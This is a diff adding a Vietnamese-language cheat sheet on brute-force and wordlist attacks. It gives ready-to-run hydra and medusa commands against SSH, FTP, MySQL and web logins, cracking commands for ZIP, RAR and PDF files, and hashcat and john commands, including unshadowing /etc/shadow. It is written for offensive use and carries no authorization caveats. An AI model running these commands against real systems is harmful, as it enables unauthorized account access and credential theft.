@@ -1,0 +1,85 @@
+ Đây là hướng dẫn Brute-force & Wordlist Attack từ cơ bản đến nâng cao — áp dụng cho NetHunter, Kali Linux, hoặc máy dùng Linux. Đây là kỹ thuật thường dùng để:
+
+    Đoán mật khẩu tài khoản mạng (SSH, FTP, Telnet, Web login...)
+
+    Đoán pass file zip, rar, PDF, MySQL, CMS admin
+
+    Kết hợp với wordlist mạnh để tấn công nhanh, hiệu quả
+
+🟢 PHẦN 1: CƠ BẢN – BRUTE-FORCE DỊCH VỤ MẠNG
+✅ 1. SSH (22), FTP (21), Telnet (23)
+
+Dùng hydra:
+
+hydra -l admin -P pass.txt ssh://192.168.1.10
+
+Hoặc:
+
+hydra -L users.txt -P rockyou.txt ftp://192.168.1.10
+
+    ✅ -l: user đơn | -L: danh sách user | -P: danh sách password
+
+✅ 2. HTTP Form (Web login)
+
+hydra -L users.txt -P pass.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+
+    ✅ F=incorrect: chuỗi xuất hiện khi đăng nhập sai.
+
+✅ 3. Dùng medusa (đa luồng hơn)
+
+medusa -h 192.168.1.10 -u admin -P pass.txt -M ssh
+
+🟡 PHẦN 2: TRUNG CẤP – BRUTE-FORCE FILE ZIP, PDF, MYSQL
+✅ 1. ZIP/RAR/7z
+
+fcrackzip -u -D -p rockyou.txt secret.zip
+
+RAR:
+
+rarcrack file.rar --type rar --threads 4 --dictionary rockyou.txt
+
+✅ 2. PDF password
+
+pdfcrack -f locked.pdf -w rockyou.txt
+
+✅ 3. MySQL root login (qua dịch vụ)
+
+hydra -l root -P pass.txt mysql://192.168.1.10
+
+🔴 PHẦN 3: NÂNG CAO – KẾT HỢP HASH, MASK, RULES
+✅ 1. Dùng hashcat để crack hash
+
+Giả sử có hash MD5:
+
+hashcat -m 0 -a 0 hash.txt rockyou.txt
+
+SHA1:
+
+hashcat -m 100 -a 0 hash.txt rockyou.txt
+
+✅ 2. Dùng john để crack /etc/shadow
+
+unshadow /etc/passwd /etc/shadow > crackme.txt
+john crackme.txt --wordlist=rockyou.txt
+
+✅ 3. Mask Attack với hashcat
+
+Biết pass dài 8 ký tự, toàn số:
+
+hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d
+
+Biết bắt đầu bằng Abcd:
+
+hashcat -m 0 -a 3 hash.txt Abcd?l?l?l?l
+
+⚙️ BONUS – TẠO WORDLIST TUỲ BIẾN VỚI crunch
+
+crunch 6 8 abc123 -o custom.txt
+
+Tạo pass từ 6–8 ký tự, chỉ chứa abc123.
+🧠 TÓM TẮT
+Mục tiêu	Công cụ	Lệnh mẫu
+SSH, FTP, Web login	hydra, medusa	hydra -L users.txt -P pass.txt ssh://ip
+Zip, PDF	fcrackzip, pdfcrack	fcrackzip -D -p dict.txt file.zip
+Hash, shadow	hashcat, john	john shadow.txt --wordlist=...
+Tạo wordlist	crunch, cupp	crunch 8 8 0123456789
